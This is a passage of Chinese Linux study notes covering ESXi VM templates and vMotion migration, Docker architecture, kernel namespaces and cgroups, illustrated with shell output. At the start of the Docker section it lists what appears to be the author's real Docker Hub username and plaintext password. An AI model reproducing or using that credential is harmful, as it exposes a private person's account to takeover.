![1659152269753](linux体系.assets/1659152269753.png)

![1659152304821](linux体系.assets/1659152304821.png)

![1659152315421](linux体系.assets/1659152315421.png)

![1659152353717](linux体系.assets/1659152353717.png)

![1659152365440](linux体系.assets/1659152365440.png)

![1659152409327](linux体系.assets/1659152409327.png)

##### 47.4.3.2 将虚拟机克隆成模版

![1659171554569](linux体系.assets/1659171554569.png)

![1659171617919](linux体系.assets/1659171617919.png)

![1659171689509](linux体系.assets/1659171689509.png)

![1659171705825](linux体系.assets/1659171705825.png)

![1659171736170](linux体系.assets/1659171736170.png)

![1659171785928](linux体系.assets/1659171785928.png)

##### 47.4.3.3 基于模版创建虚拟机

**生产中经常利用模版批量创建虚拟机,比手动安装虚拟机可以大大提高效率**

![1659171923880](linux体系.assets/1659171923880.png)

![1659171977607](linux体系.assets/1659171977607.png)

![1659172000037](linux体系.assets/1659172000037.png)

![1659172013004](linux体系.assets/1659172013004.png)

![1659172037913](linux体系.assets/1659172037913.png)

![1659172054494](linux体系.assets/1659172054494.png)

![1659172132005](linux体系.assets/1659172132005.png)



##### 47.4.3.4 将虚拟机转换为模版

**注意:将虚拟机转换成模版需要先关机虚拟机才能转换**

![1659172504830](linux体系.assets/1659172504830.png)

![1659172553501](linux体系.assets/1659172553501.png)

![1659172576918](linux体系.assets/1659172576918.png)

##### 47.4.3.5 将模版转换成虚拟机

**注意: 模版转换虚拟机时,必须都在同一台ESXi主机实现,跨主机会失败**

![1659172690318](linux体系.assets/1659172690318.png)

![1659172710233](linux体系.assets/1659172710233.png)

![1659172719944](linux体系.assets/1659172719944.png)

![1659172740955](linux体系.assets/1659172740955.png)

##### 47.4.3.6 创建windows模板

![1659172985655](linux体系.assets/1659172985655.png)

![1659172952388](linux体系.assets/1659172952388.png)

![1659174542891](linux体系.assets/1659174542891.png)

**新建虚拟机**

![1659174759220](linux体系.assets/1659174759220.png)

![1659174778771](linux体系.assets/1659174778771.png)

![1659174791698](linux体系.assets/1659174791698.png)

![1659174804268](linux体系.assets/1659174804268.png)

![1659174835969](linux体系.assets/1659174835969.png)



![1659174894275](linux体系.assets/1659174894275.png)

![1659174909206](linux体系.assets/1659174909206.png)

![1659174947508](linux体系.assets/1659174947508.png)

**安装windows,安装过程略**

![1659175055998](linux体系.assets/1659175055998.png)

**安装 Windows Server 运行sysprep程序删除个性信息**

![1659176464715](linux体系.assets/1659176576202.png)

![1659178282117](linux体系.assets/1659178282117.png)

![1659176653647](linux体系.assets/1659176653647.png)

**基于windows模板创建新的虚拟机，过程略**

![1659176694046](linux体系.assets/1659176694046.png)

![1659176868196](linux体系.assets/1659176868196.png)

### 47.5 实现虚拟机迁移

**实现将虚拟机在VMware ESXi主机之前修改光盘配置,访止迁移中出现问题**

![1659178612355](linux体系.assets/1659178612355.png)

![1659178858018](linux体系.assets/1659178858018.png)

#### 47.5.1 配置vMotion专用网络

**实现虚拟机跨主机迁移前,必须在每个ESXi主机先建vMotion 网络,否则会出现下面提示错误**

![1659178976666](linux体系.assets/1659178976666.png)

##### 47.5.1.1 在第一个ESXi主机添加vMotion网络

![1659180898791](linux体系.assets/1659180898791.png)

![1659183348144](linux体系.assets/1659183348144.png)

![1659183383569](linux体系.assets/1659183383569.png)

![1659183438580](linux体系.assets/1659183438580.png)

![1659183520962](linux体系.assets/1659183520962.png)

![1659183541382](linux体系.assets/1659183541382.png)

![1659183592251](linux体系.assets/1659183592251.png)

##### 47.5.1.2 在第二台ESXi主机也创建vMotion网络

**在第二台主机也重复上面步骤,过程略，只有下图这一步不一样**

![1659183858896](linux体系.assets/1659183858896.png)

![1659183929208](linux体系.assets/1659183929208.png)

#### 47.5.2 执行虚拟机迁移

**查看迁移过程中丢包情况**

![1659184529020](linux体系.assets/1659184529020.png)

**开始进行迁移**

![1659184605782](linux体系.assets/1659184605782.png)

![1659184893514](linux体系.assets/1659184893514.png)

![1659186177775](linux体系.assets/1659186177775.png)

![1659187146006](linux体系.assets/1659187146006.png)

![1659187185042](linux体系.assets/1659187185042.png)

![1659187327641](linux体系.assets/1659187327641.png)

![1659187434507](linux体系.assets/1659187434507.png)

**只丢了一个包，迁移成功！！！**

![1659187607766](linux体系.assets/1659187607766.png)

![1659187649840](linux体系.assets/1659187649840.png)

## 48.Docker容器

### 48.1  Docker的组成

```
docker官网: http://www.docker.com
帮助文档链接: https://docs.docker.com/
docker镜像: https://hub.docker.com/
docker中文网站: http://www.docker.org.cn/


docker账号：paranoid1997
docker密码：Xjy19970520
```

![1659190620414](linux体系.assets/1659190620414.png)

```
Docker 主机(Host): 一个物理机或虚拟机，用于运行Docker服务进程和容器，也称为宿主机，node节点。
Docker 服务端(Server): Docker守护进程，运行docker容器。
Docker 客户端(Client): 客户端使用 docker 命令或其他工具调用docker API。
Docker 镜像(Images): 镜像可以理解为创建实例使用的模板,本质上就是一些程序文件的集合。
Docker 仓库(Registry): 保存镜像的仓库，官方仓库: https://hub.docker.com/，可以搭建私有仓库harbor。
Docker 容器(Container): 容器是从镜像生成对外提供服务的一个或一组服务,其本质就是将镜像中的程序启动后生成的进程。
```

![1659191083766](linux体系.assets/1659191083766.png)

### 48.2 Namespace

```
一个宿主机运行了N个容器，多个容器共用一个 OS，必然带来的以下问题:
1）怎么样保证每个容器都有不同的文件系统并且能互不影响？
2）一个docker主进程内的各个容器都是其子进程，那么如果实现同一个主进程下不同类型的子进程？各个容器子进程间能相互通信(内存数据)吗？
3）每个容器怎么解决IP及端口分配的问题？
4）多个容器的主机名能一样吗？
5）每个容器都要不要有root用户？怎么解决账户重名问题？

namespace是Linux系统的底层概念，在内核层实现，即有一些不同类型的命名空间被部署在核内，各个docker容器运行在同一个docker主进程并且共用同一个宿主机系统内核，各docker容器运行在宿主机的用户空间，每个容器都要有类似于虚拟机一样的相互隔离的运行空间，但是容器技术是在一个进程内实现运行指定服务的运行环境，并且还可以保护宿主机内核不受其他进程的干扰和影响，如文件系统空间、网络空间、进程空间等，目前主要通过以下技术实现容器运行空间的相互隔离:
```

![1659191574901](linux体系.assets/1659191574901.png)

#### 48.2.1 MNT Namespace

```
每个容器都要有独立的根文件系统有独立的用户空间，以实现在容器里面启动服务并且使用容器的运行环境，即一个宿主机是ubuntu的服务器，可以在里面启动一个centos运行环境的容器并且在容器里面启动一个Nginx服务，此Nginx运行时使用的运行环境就是centos系统目录的运行环境，但是在容器里面是不能访问宿主机的资源，宿主机是使用chroot技术把容器锁定到一个指定的运行目录里面。
```

**例如:** 

```
/var/lib/containerd/io.containerd.runtime.v1.linux/moby/容器ID
```

**根目录:** 

```
/var/lib/docker/overlay2/ID
```

**范例:**

```
#启动三个容器用于以下验证过程:  
[root@ubuntu1804 ~]#docker version
Client: Docker Engine - Community
 Version:           19.03.5
 API version:       1.40
 Go version:       go1.12.12
 Git commit:       633a0ea838
 Built:             Wed Nov 13 07:29:52 2019
 OS/Arch:           linux/amd64
 Experimental:      false
 
Server: Docker Engine - Community
 Engine:
 Version:          19.03.5
 API version:      1.40 (minimum version 1.12)
 Go version:       go1.12.12
  Git commit:       633a0ea838
 Built:           Wed Nov 13 07:28:22 2019
 OS/Arch:         linux/amd64
 Experimental:     false
 containerd:
 Version:          1.2.10
 GitCommit:       b34a5c8af56e510852c35414db4c1f4fa6172339
 runc:
 Version:          1.0.0-rc8+dev
 GitCommit:       3e425f80a8c931f88e6d94a8c831b9d5aa481657
 docker-init:
 Version:          0.18.0
 GitCommit:       fec3683
 
 
 
[root@ubuntu1804 ~]# docker run -d --name nginx-1 -p 80:80 nginx
[root@ubuntu1804 ~]# docker run -d --name nginx-2 -p 81:80 nginx
[root@ubuntu1804 ~]# docker run -d --name nginx-3 -p 82:80 nginx
```

**范例: 查看存储**

```
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE                   COMMAND             CREATED         
    STATUS             PORTS               NAMES
d2d79c1d3695       centos:centos8.1.1911   "/bin/bash"         14 minutes ago   
  Up 14 minutes                           boring_carson
17ff44b1dbff       centos:centos8.1.1911   "/bin/bash"         17 minutes ago   
  Up 17 minutes                           interesting_austin
  
[root@ubuntu1804 ~]#ls /var/lib/containerd/io.containerd.runtime.v1.linux/moby/
17ff44b1dbff94e3578b3d3b74daae54527c1f65a279bb07f00641bda24ba580 
d2d79c1d36954642dbab35e19bf75075dc94b66c11626c72ac52910add710204

[root@ubuntu1804 ~]#ls /var/lib/docker/overlay2/0c45e9ac63195a4562a1b5fcd4089a2ad604418d381557e7c1165da
70263b75b/merged/
bin dev etc home lib lib64 lost+found media mnt opt proc root run 
sbin srv sys tmp usr var
```

**范例: 验证容器的根文件系统**

```
[root@centos8 ~]#podman exec nginx cat /etc/issue
Debian GNU/Linux 9 \n \l
[root@centos8 ~]#podman exec nginx ls /
bin
boot
data
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

**范例: 容器和宿主机共享内核**

```
[root@centos8 ~]#podman exec nginx uname -r
4.18.0-147.el8.x86_64
[root@centos8 ~]#uname -r
4.18.0-147.el8.x86_64
```

#### 48.2.2 IPC Namespace

```
一个容器内的进程间通信，允许一个容器内的不同进程的(内存、缓存等)数据访问，但是不能跨容器直接访问其他容器的数据。

简而言之：Docker能实现进程之间的隔离。
```

#### 48.2.3 UTS Namespace

```
UTS namespace（UNIX Timesharing System)包含了运行内核的名称、版本、底层体系结构类型等信息）用于系统标识，其中包含了主机名hostname和域名domainname ，它使得一个容器拥有属于自己主机名标识，这个主机名标识独立于宿主机系统和其上的其他容器。

简而言之：Docker能实现系统版本，主机名和域名的隔离。
```

**范例:** 

```
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE                   COMMAND             CREATED         
    STATUS             PORTS               NAMES
d2d79c1d3695       centos:centos8.1.1911   "/bin/bash"         34 minutes ago   
  Up 34 minutes                           boring_carson
17ff44b1dbff       centos:centos8.1.1911   "/bin/bash"         37 minutes ago   
  Up 37 minutes                           interesting_austin
  
[root@ubuntu1804 ~]#docker exec -it 17ff44b1dbff sh
sh-4.4# hostname
17ff44b1dbff
sh-4.4# cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 17ff44b1dbff

sh-4.4# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
60: eth0@if61: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
group default 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
   valid_lft forever preferred_lft forever
sh-4.4# uname -r
4.15.0-29-generic
sh-4.4# free -h
             total       used       free     shared buff/cache   available
Mem:         962Mi       268Mi       81Mi       1.0Mi       612Mi       522Mi
Swap:         1.9Gi       17Mi       1.8Gi
sh-4.4# lscpu
Architecture:       x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:         Little Endian
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           GenuineIntel
CPU family:          6
Model:               60
Model name:         Intel(R) Core(TM) i7-4710HQ CPU @ 2.50GHz
Stepping:            3
CPU MHz:             2494.237
BogoMIPS:            4988.47
Hypervisor vendor:   VMware
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:           256K
L3 cache:           6144K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca 
cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm 
constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni 
pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt 
tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault 
invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 
invpcid xsaveopt arat arch_capabilities
sh-4.4# exit
exit

[root@ubuntu1804 ~]#uname -r
4.15.0-29-generic
```

#### 48.2.4 PID Namespace

```
Linux系统中，有一个PID为1的进程(init/systemd)是其他所有进程的父进程，那么在每个容器内也要有一个父进程来管理其下属的子进程，那么多个容器的进程通PID namespace进程隔离(比如PID编号重复、器内的主进程生成与回收子进程等)。
```

![1659193509746](linux体系.assets/1659193509746.png)

```
范例:
[root@ubuntu1804 ~]#docker exec -it 17ff44b1dbff sh
sh-4.4# ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.049 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.051 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.051 ms
^Z
[1]+ Stopped(SIGTSTP)        ping 127.0.0.1

sh-4.4# ps aux
USER       PID %CPU %MEM   VSZ   RSS TTY     STAT START   TIME COMMAND
root          1  0.0  0.3  12024  3172 pts/0   Ss+  10:41   0:00 /bin/bash
root         46  1.2  0.3  12024  3228 pts/1   Ss   11:24   0:00 sh
root         51  0.0  0.2  29460  2280 pts/1   T    11:24   0:00 ping 127.0.0.1
root         52  0.0  0.3  43960  3332 pts/1   R+   11:24   0:00 ps aux
sh-4.4# 

[root@ubuntu1804 ~]#pstree -p
systemd(1)─┬─VGAuthService(816)
           ├─accounts-daemon(819)─┬─{accounts-daemon}(828)
           │                     └─{accounts-daemon}(839)
           ├─agetty(887)
           ├─atd(807)
           ├─blkmapd(512)
           ├─containerd(3371)─┬─containerd-shim(12233)─┬─bash(12259)
           │                 │                       ├─sh(13359)───ping(13395)
           │                 │                       ├─{containerd-shim}
(12234)
```

**下图是在一个容器内使用top命令看到的PID为1的进程是nginx:**

![1659194032064](linux体系.assets/1659194032064.png)

**容器内的Nginx主进程与工作进程:** 

![1659194062166](linux体系.assets/1659194062166.png)

**那么宿主机的PID究竟与容器内的PID是什么关系？**

**范例: 查看宿主机上的PID信息**

![1659194238696](linux体系.assets/1659194238696.png)

#### 48.2.5 NET Namespace

```
每一个容器都类似于虚拟机一样有自己的网卡、监听端口、TCP/IP协议栈等。

Docker使用network namespace启动一个vethX接口，这样你的容器将拥有它自己的桥接ip地址，通常是docker0，而docker0实质就是Linux的虚拟网桥,网桥是在OSI七层模型的数据链路层的网络设备，通过mac地址对网络进行划分，并且在不同网络直接传递数据。
```

![1659194500087](linux体系.assets/1659194500087.png)

**查看宿主机的网卡信息:** 

![1659194590082](linux体系.assets/1659194590082.png)

**查看宿主机桥接设备:** 

![1659194638580](linux体系.assets/1659194638580.png)

**逻辑网络图:** 

![1659194672319](linux体系.assets/1659194672319.png)

**宿主机iptables规则:**

![1659194707505](linux体系.assets/1659194707505.png)

![1659194782809](linux体系.assets/1659194782809.png)

```
范例:
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES

[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:34:df:91 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe34:df91/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:9c:90:17:99 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:9cff:fe90:1799/64 scope link 
       valid_lft forever preferred_lft forever
       
 
[root@ubuntu1804 ~]#docker run -itd -p 8888:80 nginx 
5dee9be9afdbab8c2f6c4c5eb0f956c9579efe93110daf638f8fd15f43d961e2

[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
       inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:34:df:91 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe34:df91/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
group default 
   link/ether 02:42:9c:90:17:99 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:9cff:fe90:1799/64 scope link 
       valid_lft forever preferred_lft forever
71: veth9e4fb80@if70: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue 
master docker0 state UP group default 
   link/ether a2:7b:84:f7:8b:ff brd ff:ff:ff:ff:ff:ff link-netnsid 0
   inet6 fe80::a07b:84ff:fef7:8bff/64 scope link 
       valid_lft forever preferred_lft forever
       
[root@ubuntu1804 ~]#docker exec -it 5dee9b bash

root@5dee9be9afdb:/# apt update
Get:1 http://security-cdn.debian.org/debian-security buster/updates InRelease 
[65.4 kB]
Get:2 http://security-cdn.debian.org/debian-security buster/updates/main amd64 
Packages [173 kB]
Get:3 http://deb.debian.org/debian buster InRelease [122 kB]     
Get:4 http://deb.debian.org/debian buster-updates InRelease [49.3 kB]
Get:5 http://deb.debian.org/debian buster/main amd64 Packages [7908 kB]
Get:6 http://deb.debian.org/debian buster-updates/main amd64 Packages [5792 B]   
                                                    
Fetched 8323 kB in 13s (656 kB/s)                                               
                                                     
Reading package lists... Done
Building dependency tree       
Reading state information... Done
All packages are up to date.
root@5dee9be9afdb:/# apt install net-tools
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following NEW packages will be installed:
 net-tools
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 248 kB of archives.
After this operation, 1002 kB of additional disk space will be used.
Get:1 http://deb.debian.org/debian buster/main amd64 net-tools amd64 
1.60+git20180626.aebd88e-1 [248 kB]
Fetched 248 kB in 0s (610 kB/s)
debconf: delaying package configuration, since apt-utils is not installed
Selecting previously unselected package net-tools.
(Reading database ... 7203 files and directories currently installed.)
Preparing to unpack .../net-tools_1.60+git20180626.aebd88e-1_amd64.deb ...
Unpacking net-tools (1.60+git20180626.aebd88e-1) 
................................................................................
.]
Setting up net-tools (1.60+git20180626.aebd88e-1) 
...#########....................................................................
] 


root@5dee9be9afdb:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
       inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255
       ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet)
       RX packets 1926 bytes 8680620 (8.2 MiB)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 1466 bytes 80919 (79.0 KiB)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
       inet 127.0.0.1 netmask 255.0.0.0
       loop txqueuelen 1000 (Local Loopback)
       RX packets 0 bytes 0 (0.0 B)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 0 bytes 0 (0.0 B)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
root@5dee9be9afdb:/# exit
exit

[root@ubuntu1804 ~]#iptables -vnL -t nat
Chain PREROUTING (policy ACCEPT 9 packets, 563 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 DOCKER     all  -- *     *       0.0.0.0/0            0.0.0.0/0   
        ADDRTYPE match dst-type LOCAL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
Chain OUTPUT (policy ACCEPT 1 packets, 76 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 DOCKER     all  -- *     *       0.0.0.0/0           !127.0.0.0/8 
        ADDRTYPE match dst-type LOCAL
Chain POSTROUTING (policy ACCEPT 1 packets, 76 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
   71  4548 MASQUERADE all  -- *     !docker0  172.17.0.0/16        0.0.0.0/0 
          
    0     0 MASQUERADE tcp  -- *     *       172.17.0.2           172.17.0.2 
          tcp dpt:80
Chain DOCKER (2 references)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 RETURN     all  -- docker0 *       0.0.0.0/0            0.0.0.0/0   
        
    0     0 DNAT       tcp  -- !docker0 *       0.0.0.0/0            0.0.0.0/0 
          tcp dpt:8888 to:172.17.0.2:80
          
[root@ubuntu1804 ~]#ss -ntlp
State     Recv-Q     Send-Q         Local Address:Port         Peer 
Address:Port                      
LISTEN    0          64                    0.0.0.0:2049               0.0.0.0:* 
                                                      
LISTEN    0          128                   0.0.0.0:43045              0.0.0.0:* 
        users:(("rpc.mountd",pid=788,fd=17))          
LISTEN    0          64                    0.0.0.0:38599              0.0.0.0:* 
                                                      
LISTEN    0          128                   0.0.0.0:111                0.0.0.0:* 
        users:(("rpcbind",pid=725,fd=8))              
LISTEN    0          128                   0.0.0.0:38805              0.0.0.0:* 
        users:(("rpc.mountd",pid=788,fd=13))          
LISTEN    0          128             127.0.0.53%lo:53                 0.0.0.0:* 
        users:(("systemd-resolve",pid=785,fd=13))     
LISTEN    0          128                   0.0.0.0:22                 0.0.0.0:* 
        users:(("sshd",pid=863,fd=3))                 
LISTEN    0          128                 127.0.0.1:6010               0.0.0.0:* 
        users:(("sshd",pid=913,fd=9))                 
LISTEN    0          128                 127.0.0.1:6011               0.0.0.0:* 
        users:(("sshd",pid=913,fd=14))                
LISTEN    0          128                   0.0.0.0:43775              0.0.0.0:* 
        users:(("rpc.mountd",pid=788,fd=9))           
LISTEN    0          64                       [::]:33633                 [::]:* 
                                                      
LISTEN    0          64                       [::]:2049                 [::]:* 
                                                      
LISTEN    0          128                     [::]:55659                 [::]:* 
        users:(("rpc.mountd",pid=788,fd=15))          
LISTEN    0          128                     [::]:111                   [::]:* 
        users:(("rpcbind",pid=725,fd=11))             
LISTEN    0          128                     [::]:44917                 [::]:* 
        users:(("rpc.mountd",pid=788,fd=11))          
LISTEN    0          128                     [::]:22                   [::]:* 
        users:(("sshd",pid=863,fd=4))                 
LISTEN    0          128                         *:8888                     *:* 
        users:(("docker-proxy",pid=15249,fd=4))       
LISTEN    0          128                     [::]:41529                 [::]:* 
        users:(("rpc.mountd",pid=788,fd=19))          
LISTEN    0          128                     [::1]:6010                 [::]:* 
        users:(("sshd",pid=913,fd=8))                 
LISTEN    0          128                     [::1]:6011                 [::]:* 
        users:(("sshd",pid=913,fd=11))                
        
        
[root@ubuntu1804 ~]#apt install bridge-utils
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Suggested packages:
 ifupdown
The following NEW packages will be installed:
 bridge-utils
0 upgraded, 1 newly installed, 0 to remove and 225 not upgraded.
Need to get 30.1 kB of archives.
After this operation, 102 kB of additional disk space will be used.
Get:1 http://mirrors.aliyun.com/ubuntu bionic/main amd64 bridge-utils amd64 1.5-
15ubuntu1 [30.1 kB]
Fetched 30.1 kB in 0s (259 kB/s)  
ySelecting previously unselected package bridge-utils.
(Reading database ... 71346 files and directories currently installed.)
Preparing to unpack .../bridge-utils_1.5-15ubuntu1_amd64.deb ...
Unpacking bridge-utils (1.5-15ubuntu1) 
................................................................................
...........] 
Setting up bridge-utils (1.5-15ubuntu1) 
...###############################..............................................
..........] 
Processing triggers for man-db (2.8.3-2) 
...###################################################################..........
.........] 


[root@ubuntu1804 ~]#brctl show
bridge name bridge id STP enabled interfaces
docker0 8000.02429c901799 no veth9e4fb80
```

#### 48.2.5 User Namespace

```
各个容器内可能会出现重名的用户和用户组名称，或重复的用户UID或者GID，那么怎么隔离各个容器内的用户空间呢？

User Namespace允许在各个宿主机的各个容器空间内创建相同的用户名以及相同的用户UID和GID，只是会把用户的作用范围限制在每个容器内，即A容器和B容器可以有相同的用户名称和ID的账户，但是此用户的有效范围仅是当前容器内，不能访问另外一个容器内的文件系统，即相互隔离、互不影响、永不相见。
```

![1659195076823](linux体系.assets/1659195076823.png)

### 48.3 Control groups

```
Linux Cgroups的全称是Linux Control Groups,是Linux内核的一个功能.最早是由Google的工程师（主要是Paul Menage和Rohit Seth）在2006年发起，最早的名称为进程容器（process containers）。在2007年时，因为在Linux内核中，容器（container）这个名词有许多不同的意义，为避免混乱，被重命名为cgroup，并且被合并到2.6.24版的内核中去。自那以后，又添加了很多功能。


如果不对一个容器做任何资源限制，则宿主机会允许其占用无限大的内存空间，有时候会因为代码bug程序会一直申请内存，直到把宿主机内存占完，为了避免此类的问题出现，宿主机有必要对容器进行资源分配限制，比如CPU、内存等。

Cgroups 最主要的作用，就是限制一个进程组能够使用的资源上限，包括CPU、内存、磁盘、网络带宽等等。此外，还能够对进程进行优先级设置，资源的计量以及资源的控制(比如:将进程挂起和恢复等操作)。
```

#### 48.3.1 验证系统cgroups

Cgroups在内核层默认已经开启，从CentOS 和 Ubuntu 不同版本对比，显然内核较新的支持的功能更多。

**Centos 8.1 cgroups:**

```
[root@centos8 ~]#cat /etc/redhat-release 
CentOS Linux release 8.1.1911 (Core) 
[root@centos8 ~]#grep CGROUP /boot/config-4.18.0-147.el8.x86_64 
CONFIG_CGROUPS=y
CONFIG_BLK_CGROUP=y
# CONFIG_DEBUG_BLK_CGROUP is not set
CONFIG_CGROUP_WRITEBACK=y
CONFIG_CGROUP_SCHED=y
CONFIG_CGROUP_PIDS=y
CONFIG_CGROUP_RDMA=y
CONFIG_CGROUP_FREEZER=y
CONFIG_CGROUP_HUGETLB=y
CONFIG_CGROUP_DEVICE=y
CONFIG_CGROUP_CPUACCT=y
CONFIG_CGROUP_PERF=y
CONFIG_CGROUP_BPF=y
# CONFIG_CGROUP_DEBUG is not set
CONFIG_SOCK_CGROUP_DATA=y
# CONFIG_BLK_CGROUP_IOLATENCY is not set
CONFIG_NETFILTER_XT_MATCH_CGROUP=m
CONFIG_NET_CLS_CGROUP=y
CONFIG_CGROUP_NET_PRIO=y
CONFIG_CGROUP_NET_CLASSID=y
```

**Centos 7.6 cgroups:** 

```
[root@centos7 ~]#cat /etc/redhat-release 
CentOS Linux release 7.6.1810 (Core) 
[root@centos7 ~]#grep CGROUP /boot/config-3.10.0-957.el7.x86_64 
CONFIG_CGROUPS=y
# CONFIG_CGROUP_DEBUG is not set
CONFIG_CGROUP_FREEZER=y
CONFIG_CGROUP_PIDS=y
CONFIG_CGROUP_DEVICE=y
CONFIG_CGROUP_CPUACCT=y
CONFIG_CGROUP_HUGETLB=y
CONFIG_CGROUP_PERF=y
CONFIG_CGROUP_SCHED=y
CONFIG_BLK_CGROUP=y
# CONFIG_DEBUG_BLK_CGROUP is not set
CONFIG_NETFILTER_XT_MATCH_CGROUP=m
CONFIG_NET_CLS_CGROUP=y
CONFIG_NETPRIO_CGROUP=y
```

**ubuntu cgroups:** 

```
[root@ubuntu1804 ~]#grep CGROUP /boot/config-4.15.0-29-generic 
CONFIG_CGROUPS=y
CONFIG_BLK_CGROUP=y
# CONFIG_DEBUG_BLK_CGROUP is not set
CONFIG_CGROUP_WRITEBACK=y
CONFIG_CGROUP_SCHED=y
CONFIG_CGROUP_PIDS=y
CONFIG_CGROUP_RDMA=y
CONFIG_CGROUP_FREEZER=y
CONFIG_CGROUP_HUGETLB=y
CONFIG_CGROUP_DEVICE=y
CONFIG_CGROUP_CPUACCT=y
CONFIG_CGROUP_PERF=y
CONFIG_CGROUP_BPF=y
# CONFIG_CGROUP_DEBUG is not set
CONFIG_SOCK_CGROUP_DATA=y
CONFIG_NETFILTER_XT_MATCH_CGROUP=m
CONFIG_NET_CLS_CGROUP=m
CONFIG_CGROUP_NET_PRIO=y
CONFIG_CGROUP_NET_CLASSID=y
```

**cgroups中内存模块:** 

```
[root@ubuntu1804 ~]#grep MEMCG /boot/config-4.15.0-29-generic
CONFIG_MEMCG=y
CONFIG_MEMCG_SWAP=y
# CONFIG_MEMCG_SWAP_ENABLED is not set
CONFIG_SLUB_MEMCG_SYSFS_ON=y
```

#### 48.3.2 cgroups具体实现

```
blkio: 块设备IO限制
cpu: 使用调度程序为 cgroup 任务提供 cpu 的访问
cpuacct: 产生 cgroup 任务的 cpu 资源报告
cpuset: 如果是多核心的 cpu，这个子系统会为 cgroup 任务分配单独的 cpu 和内存
devices: 允许或拒绝 cgroup 任务对设备的访问
